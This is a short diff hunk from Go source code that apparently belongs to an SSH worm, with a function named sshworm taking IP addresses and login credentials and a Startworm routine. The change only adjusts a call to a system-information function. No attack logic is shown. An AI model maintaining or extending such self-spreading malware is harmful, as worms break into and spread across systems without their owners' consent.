@@ -84,7 +84,7 @@ func sshworm(ips []string, login map[string][]string) {
 
 func Startworm() {
 	ip, err := system.GETIPDNS()
-	OS, _ := system.GETSYSTEM()
+	OS, _, _ := system.GETSYSTEM()
 
 	var valid []string
 	if err != nil {
